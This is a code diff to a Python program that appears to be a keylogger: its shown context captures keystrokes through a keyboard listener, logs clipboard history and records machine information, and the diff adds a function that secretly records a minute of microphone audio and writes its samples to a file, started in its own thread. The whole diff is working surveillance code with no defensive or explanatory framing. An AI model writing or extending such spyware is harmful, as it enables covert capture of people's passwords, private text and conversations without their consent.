@@ -64,11 +64,26 @@ def get_clipboard_history():
 				file.write("\n")
 			clipboard_history = pyperclip.paste()
 
+def record_sound():
+	sample_rate = 44100
+	recording_duration = 60
+	file_name = "audio.wav"
+	print("recording....")
+	recording = sd.rec(int(sample_rate * recording_duration), samplerate=sample_rate, channels=2)
+	sd.wait()
+	open(file_name, "w+")
+	write(file_name, sample_rate, recording)
+	audio_file = read(file_name)
+	with open("sound.text", "w") as file:
+		file.write(str(audio_file[1]))
+
 def main():
-	machine_info      = threading.Thread(target=write_machine_info_file)
+	machine_info = threading.Thread(target=write_machine_info_file)
 	machine_info.start()
 	clipboard_history = threading.Thread(target=get_clipboard_history)
 	clipboard_history.start()
+	sound_recording = threading.Thread(target=record_sound)
+	sound_recording.start()
 	with Listener(on_press=on_press) as listener:
 		listener.join()
 
